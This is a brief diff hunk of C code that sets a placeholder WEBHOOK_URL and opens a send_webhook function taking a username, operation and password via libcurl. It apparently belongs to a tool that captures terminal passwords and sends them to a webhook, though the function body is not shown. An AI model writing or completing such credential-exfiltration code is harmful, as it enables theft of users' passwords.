@@ -8,7 +8,7 @@
 #include <termios.h>
 #include <sys/wait.h>
 
-#define WEBHOOK_URL ""
+#define WEBHOOK_URL "YOUR_WEBHOOK_URL"
 
 void send_webhook(const char *username, const char *operation, const char *password) {
     CURL *curl;
